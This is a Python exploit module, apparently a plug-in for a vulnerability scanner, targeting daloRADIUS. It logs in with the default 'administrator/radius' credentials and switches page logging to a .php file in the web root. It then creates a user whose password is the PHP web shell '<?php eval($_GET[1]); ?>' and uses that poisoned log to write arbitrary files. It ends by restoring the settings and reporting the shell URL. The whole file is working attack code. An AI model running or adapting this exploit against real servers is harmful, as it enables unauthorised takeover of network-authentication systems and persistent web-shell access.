# -*- coding:utf-8 -*-
# daloradius弱密码
import time

from VulnScanModel.models import VulnScan
from ServiceScanModel.models import ServiceScan
from vulscan_Project.requestClass import Requests, session

log_file = "passer-W.php"
config_data = f"config_pageslogging=yes&config_querieslogging=yes&config_actionslogging=yes&config_debuglogging=yes&config_debugpageslogging=yes&config_filenamelogging={log_file}&submit=%E5%BA%94%E7%94%A8"
old_config_data = "config_pageslogging=no&config_querieslogging=no&config_actionslogging=no&config_debuglogging=no&config_debugpageslogging=no&config_filenamelogging=/tmp/daloradius.log&submit=%E5%BA%94%E7%94%A8"
user_data = "authType=userAuth&username=passer-W%40&password=<?php eval($_GET[1]); ?>&passwordType=Cleartext-Password&groups%5B%5D=&submit=%E5%BA%94%E7%94%A8&firstname=&lastname=&email=&department=&company=&workphone=&homephone=&mobilephone=&address=&city=&state=&country=&zip=&notes=&portalLoginPassword=&bi_contactperson=&bi_company=&bi_email=&bi_phone=&bi_address=&bi_city=&bi_state=&bi_country=&bi_zip=&bi_postalinvoice=&bi_faxinvoice=&bi_emailinvoice=&bi_paymentmethod=&bi_cash=&bi_creditcardname=&bi_creditcardnumber=&bi_creditcardverification=&bi_creditcardtype=&bi_creditcardexp=&bi_lead=&bi_coupon=&bi_ordertaker=&bi_notes=&bi_billdue=&bi_nextinvoicedue="
session = session()


class EXP:
    def __init__(self, vuln: VulnScan):
        self.vuln = vuln
        self.requestUtil = Requests(vuln.cookies)

    def get_data(self, data):
        return {i.split("=")[0]: i.split("=")[-1] for i in data.split("&")}

    def add_user(self, url):
        resp = self.requestUtil.post(f"{url}/mng-new.php", self.get_data(user_data), session=session)

    def delete_user(self, url):
        self.requestUtil.get(url + "/mng-del.php?username%5B%5D=passer-W%2540", session=session)

    def write_file(self, url="", filename="", filedata=""):
        resp = self.requestUtil.get(f"{url}/{log_file}?1=file_put_contents('{filename}', '{filedata}');", session=session)

    def exp(self, cmd, content=""):
        self.requestUtil.post(f"{self.vuln.url}/dologin.php", data={"operator_user": "administrator", "operator_pass": "radius"},
                         session=session)
        resp = self.requestUtil.post(f"{self.vuln.url}/config-logging.php", data=self.get_data(data=config_data), session=session)
        time.sleep(1)
        self.add_user(self.vuln.url)
        self.delete_user(self.vuln.url)
        self.write_file(self.vuln.url, cmd, content)
        resp = self.requestUtil.post(f"{self.vuln.url}/config-logging.php", data=self.get_data(data=old_config_data), session=session)
        resp = self.requestUtil.get(self.vuln.url + "/" + cmd)
        if resp.status_code == 200:
            return f"文件已写入，shell地址：\n{self.vuln.url}/{cmd}"
        else:
            return "权限不足，文件写入失败"
